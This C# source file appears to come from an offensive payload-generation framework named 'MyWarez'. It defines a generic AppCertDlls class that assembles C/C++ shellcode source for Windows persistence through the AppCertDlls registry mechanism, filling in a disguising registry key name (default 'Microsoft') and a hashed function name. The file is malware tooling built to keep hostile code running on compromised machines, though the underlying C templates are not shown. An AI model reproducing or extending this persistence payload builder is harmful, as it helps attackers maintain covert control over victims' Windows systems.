using System.Collections.Generic;
using System.IO;

using MyWarez.Core;
using MyWarez.Base;

namespace MyWarez.Payloads
{
    public sealed class AppCertDlls<T> : ShellcodeCCxxSource, IShellcodeCCxxSourceIParameterlessCFunction
        where T : IGetTargetPathW, IShellcodeCCxxSource
    {
        private static readonly string ResourceDirectory = Path.Join(Core.Constants.PayloadsResourceDirectory, "Windows", "Persistence", nameof(AppCertDlls<T>));
        private static readonly string KeynamePlaceholder = Utils.StringToCArrary(@"Microsoft", wide: true);
        private static readonly string FunctionNamePlaceholder = "AppCertDlls";


        public AppCertDlls(T getTargetPath, string keyName = "Microsoft")
            : base(SourceDirectoryToSourceFiles(ResourceDirectory, additionalSources: new List<ICCxxSource>() { getTargetPath }))
        {
            FindAndReplace(SourceFiles, KeynamePlaceholder, Utils.StringToCArrary(keyName, wide: true));
            FindAndReplace(SourceFiles, FunctionNamePlaceholder, ((ICFunction)this).Name);
        }

        string ICFunction.Name => FunctionNamePlaceholder + GetHashCode();
        public IEnumerable<string> ParameterTypes => null;

    }
}